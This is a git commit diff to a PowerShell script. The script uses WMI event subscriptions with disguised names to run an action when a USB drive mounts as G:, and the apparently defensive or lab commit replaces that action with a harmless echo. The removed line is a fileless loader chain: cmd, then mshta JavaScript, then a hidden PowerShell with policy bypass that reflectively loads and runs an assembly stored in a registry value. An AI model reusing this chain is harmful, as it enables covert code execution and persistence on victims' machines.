18c61556bc3f98fd5271c67e131341d453857fcd
elosdfir <191758685+elosdfir@users.noreply.github.com>
2026-03-01 16:48:25 +0000

    Update wmi.ps1

--- wmi.ps1
+++ wmi.ps1
@@ -1,12 +1,6 @@
 $usb = "SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2 AND DriveName = 'G:'"
-
 $filter = Register-CimIndicationEvent -Namespace root\cimv2 -Query $usb -SourceIdentifier "NetLbfoTeamNic"
-
 $injection = {
-    Start-Process cmd.exe -ArgumentList '/c mshta "javascript:close(new ActiveXObject(''WScript.Shell'').run(''powershell -ExecutionPolicy Bypass -Command \"[Reflection.Assembly]::Load([Microsoft.Win32.Registry]::ClassesRoot.OpenSubKey(\\\".osk\\\").GetValue(\\\"CryptA\\\")).EntryPoint.Invoke($null,$null)\"'' ,0));"'
+    Start-Process cmd.exe -ArgumentList "/c echo USB G: inserted & pause"
 }
-
 Register-CimIndicationEvent -Namespace root\cimv2 -Query $usb -Action $injection -SourceIdentifier "NetLbfoTeamMember"
-
-Write-Host "Fixed?" -ForegroundColor Cyan
-Read-Host
